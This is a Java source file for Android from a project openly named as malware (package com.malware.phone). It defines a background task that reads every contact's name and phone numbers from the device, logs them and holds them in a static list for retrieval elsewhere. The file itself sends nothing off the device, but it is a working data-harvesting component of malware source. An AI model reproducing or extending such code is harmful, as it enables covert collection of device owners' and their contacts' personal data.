package com.malware.phone;

import java.util.ArrayList;

import android.content.ContentResolver;
import android.database.Cursor;
import android.os.AsyncTask;
import android.provider.ContactsContract;
import android.util.Log;

public class FetchContactsTask extends AsyncTask {

	private static ArrayList<ArrayList<String>> contactsList;

	private final boolean VERBOSE = true;
	private final String TAG = "FetchContactsTask";

	@Override
	protected Object doInBackground(Object... params) {
		
		if (VERBOSE) Log.d(TAG, "Start of FetchContactsTask");

		fetchContacts((ContentResolver) params[0]);
		
		if (contactsList != null) {
			for (int j = 0 ; j < contactsList.size() ; j++) {
				if (VERBOSE) Log.i(TAG, contactsList.get(j).get(0) + " " + contactsList.get(j).get(1));
			}
		}
		
		if (VERBOSE) Log.d(TAG, "End of FetchContactsTask");
		
		return null;
	}

	private void fetchContacts(ContentResolver cr) {

		Cursor c = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
		String id;
		contactsList = new ArrayList<ArrayList<String>>(c.getCount());
		c.moveToFirst();

		for (int i = 0; i < c.getCount(); i++) {
			ArrayList<String> contactInfo = new ArrayList<String>(2);
			contactInfo.add(0, c.getString(c.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)));
			id = c.getString(c.getColumnIndex(ContactsContract.Contacts._ID));

			if (Integer.parseInt(c.getString(c.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
				Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[] { id }, null);
				while (pCur.moveToNext()) {
					contactInfo.add(1, pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
				}
			}
			contactsList.add(i, contactInfo);
			c.moveToNext();		
		}
		c.close();
	}

	public static ArrayList<ArrayList<String>> getContactsList() {
		return contactsList;
	}
}
